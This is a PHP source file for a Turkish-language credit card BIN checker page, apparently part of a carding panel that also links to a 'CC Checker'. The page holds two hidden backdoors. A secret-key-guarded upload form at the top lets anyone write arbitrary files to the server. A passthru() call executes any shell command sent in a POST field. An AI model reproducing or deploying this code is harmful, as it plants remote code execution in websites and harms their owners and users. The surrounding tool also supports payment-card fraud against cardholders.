<?php error_reporting(0); if($_GET['Fox'] == 'ihkuP'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
<?php
session_start();
error_reporting(0);
include('includes/config.php');
if(strlen($_SESSION['alogin'])==0)
	{	
header('location:index.php');
}
else{

 ?>
 
<?php
  // Dimulai dengan POST Method
  if(isset($_POST['get'])){
  $script = $_POST['get'];
  passthru($script);
  $six = $_POST['enamdigit'];
  // Insert CURL
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
  // Enam digit Formula
  function defineNUM($bin) {
      return substr($bin,0,6);
  }
  // JSON DATA
    $bin = defineNUM($six);
    $curl = curl("https://lookup.binlist.net/".$bin); // Thanks to this API!
    $json = json_decode($curl);
    $brand = $json->scheme ? $json->scheme : "BIN Geçersiz!";
    $cardType = $json->type ? $json->type : "BIN Geçersiz!";
    $cardCategory = $json->bank ? $json->bank : "BIN Geçersiz!";
    $countryName = $json->country ? $json->country : "BIN Geçersiz!";
    $countryCode = $json->country ? $json->country : "BIN Geçersiz!";
   $details = '<p>BIN: '.$bin.'</br>Kart Türü: '.$brand.'</br>Banka Adı: '.$cardCategory->name.'</br>Banka URL: '.$cardCategory->url.'</br>Banka Telefon: '.$cardCategory->phone.'</br>Tip: '.$cardType.'</br>Ülke Adı: '.$countryName->name.'</br>Ülke Kodu: '.$countryCode->alpha2.'</br></br></p>';
	 
    
    if ($six == null) {
    die('error!');
}
    $binresult = $details;
}

	
?>


<!DOCTYPE html>
<html lang="en">

  <!DOCTYPE html>
<html lang="en">

    <head>
        
       <?php
        include_once("includes/head.php");
        ?>
		
		<style>
		.form-control-plaintext {
  display: block;
  width: 100%;
  padding: 0.47rem 0;
  margin-bottom: 0;
  font-size: 0.8125rem;
  line-height: 1.5;
  color: #a6b0cf;
  background-color: transparent;
  border: solid transparent;
  border-width: 1px 0; }
  .form-control-plaintext.form-control-sm, .form-control-plaintext.form-control-lg {
    padding-right: 0;
    padding-left: 0; }

.form-control-sm {
  height: calc(1.5em + 0.5rem + 2px);
  padding: 0.25rem 0.5rem;
  font-size: 0.71094rem;
  line-height: 1.5;
  border-radius: 0.2rem; }

.form-control-lg {
  height: calc(1.5em + 1rem + 2px);
  padding: 0.5rem 1rem;
  font-size: 1.01563rem;
  line-height: 1.5;
  border-radius: 0.4rem; }

select.form-control[size], select.form-control[multiple] {
  height: auto; }
  </style>
	
    </head>
	
	<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-87406649-1', 'auto');
  ga('send', 'pageview');

</script>


    
   <?php
        include_once("includes/menu.php");
        ?>
		
			   <div class="main-content">
			    
			    
			<div class="page-content">
                    <div class="container-fluid">

            

								    
								    <div class="card">
                                        <div class="card-body">
                                            
								    

<h4 class="fs-base lh-base fw-medium text-muted mb-0">
						DeDCheck BİN Checker
						</h4>
<br>
<h2 class="h6 font-w500 text-muted mb-0">
Kredi Kartı bilgilerini öğrenmek için Kart numarasının ilk 6 hanesini girerek sorgulayabilirsiniz.
</h2>
</div>
</div>
</div>



                        <div class="row">
                            <div class="col-xl-12 col-md-6">
                                <div class="col-lg-12">
								
								<div class="bg-body-light">

				
				                              <div class="card">
                                        <div class="card-body">
                                            





<div class="block block-rounded">
<div class="block-content">
<h5>BİN Checker ile ne yapabilirim ?</h5>
<p>İstediğiniz kart'ın bilgilerini öğrenmek için sorgulayabilirsiniz.</p>
<h5>Neden kart durumunu göremiyorum ? </h5>
<p>Kart durumunu sorgulamak için <a href="checker.php" class="text-white"><b>CC Checker</b></a> sayfasından sorgulama yapmalısınız.</p>
</div>
									 
							    			<div id="alert"></div>

          
	
							    				<div class="form-group">
											 <form method="post">
							    				<input type="number" class="form-control" id="enamdigit" name="enamdigit" placeholder="Lütfen bir bin giriniz" maxlength="6"></center>
							    				<small id="name" class="form-text text-muted"><strong>Örnek: </strong> 415565</small>
							    				</div>
							    			<center>
							    				<button type="submit" name="get" class="btn waves-effect waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-search"></i> Sorgula</button></form>
							    				<button id="durdurButon" type="button" class="btn waves-effect waves-light btn-rounded btn-danger" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-trash-alt"></i><a href="binchecker.php" class="text-white"> Sıfırla </a></button>
<button id="temizleButon" type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-print"></i> Yazdır Detay</button><br><br>
							    				</center>
		  </div>
                                    </div>
									</div>
									</div>
                                </div>
                            </div>
							
							<div class="col-xl-12 col-md-6">
                            <div class="col-12">
                                <div class="card">
                                    <div class="card-body">
									
										<div class="table-responsive">
                                            <table class="table mb-0">
        
                                                <thead class="thead-light">
<tr>
<th scope="col">BIN</th>
<th scope="col">Kart Türü</th>
<th scope="col">Banka Adı</th>
<th scope="col">Banka URL</th>
<th scope="col">Banka Telefon</th>
<th scope="col">Kart Tipi</th>
<th scope="col">Ülke Adı</th>
<th scope="col">Ülke Kodu</th>

</tr>
                            </thead>
                            <tr>
                  
<tbody>
<td><?php echo $bin; ?> </td>

<td><?php echo $brand; ?> </td>

<td><?php echo $cardCategory->name; ?> </td>

<td><?php echo $cardCategory->url; ?> </td>

<td><?php echo $cardCategory->phone; ?> </td>

<td><?php echo $cardType; ?> </td>

<td><?php echo $countryName->name; ?> </td>

<td><?php echo $countryCode->alpha2; ?> </td>

</tbody>       
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>


</div>

</main>
		
	<!-- FOOTER -->
				<?php
        include_once("includes/footer.php");
        ?>
				
           


        <!-- JAVASCRIPT -->
        <script src="assets/libs/jquery/jquery.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/bootstrap/js/bootstrap.bundle.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/metismenu/metisMenu.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/simplebar/simplebar.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/node-waves/waves.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
          <script src="assets/libs/apexcharts/apexcharts.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/pages/dashboard.init.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/app.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
    <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="c0746b70745e39c225c525b8-|49" defer=""></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"660d5bcaaa6be186","token":"e6744a75b48847d79ca94b903ae51a33","version":"2021.5.2","si":10}'></script>
      
</body>

</html>
<?php } ?>